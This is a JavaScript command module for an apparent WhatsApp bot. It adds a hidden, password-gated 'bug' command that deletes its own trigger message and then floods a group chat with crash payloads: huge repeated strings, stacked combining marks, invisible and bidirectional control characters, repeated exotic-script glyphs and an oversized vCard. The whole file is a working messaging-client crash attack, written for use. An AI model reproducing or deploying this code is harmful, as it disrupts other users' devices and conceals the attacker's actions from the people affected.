// ATTACK BUILD — DEVELOPER / password. Hidden. Strip on RV.
import {
  allowBugAttack,
  isDeveloper,
  isGroup,
  requestBugAuth
} from "../core/helpers.js";

const JV = "\uA9BE";

function buildPayload(type) {
  if (type === "long") return { text: "A".repeat(20000) };
  if (type === "repeat") return { text: "X".repeat(2000) };
  if (type === "invisible") {
    const inv = "\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\uFEFF";
    return { text: inv.repeat(80) };
  }
  if (type === "stack" || type === "marks") {
    const mark = "\u0301";
    const stack = "a" + mark.repeat(25);
    return { text: Array(30).fill(stack).join(" ") };
  }
  if (type === "script" || type === "exotic") {
    const exotic = "ᬀᬁᬂᬃꦀꦁꦃꦄༀ༁" + JV;
    return { text: exotic.repeat(500) };
  }
  if (type === "contact") {
    const huge = "BEGIN:VCARD\nVERSION:3.0\n" + ("FN:Crash\n").repeat(5000) + "END:VCARD";
    return { contacts: { displayName: "x", contacts: [{ vcard: huge }] } };
  }
  return { text: "BUG " + JV.repeat(25000) };
}

export default {
  name: "bug",
  aliases: ["bug"],
  order: 9990,
  match(__ctx) { return __ctx.cmd === "bug"; },
  async run(__ctx) {
    const { sock, msg, args, jid, send } = __ctx;
    if (!isGroup(jid)) return { __done: true, value: true };

    if (!allowBugAttack(sock, msg) && !isDeveloper(sock, msg)) {
      requestBugAuth(sock, msg, "bug", args);
      await send("🔐 *Password required*\nOwner password reply karo (90s).");
      return { __done: true, value: true };
    }

    try { await sock.sendMessage(jid, { delete: msg.key }); } catch {}
    const type = String(args[0] || "crash").toLowerCase();
    try { await sock.sendMessage(jid, buildPayload(type)); } catch {}
    return { __done: true, value: true };
  }
};
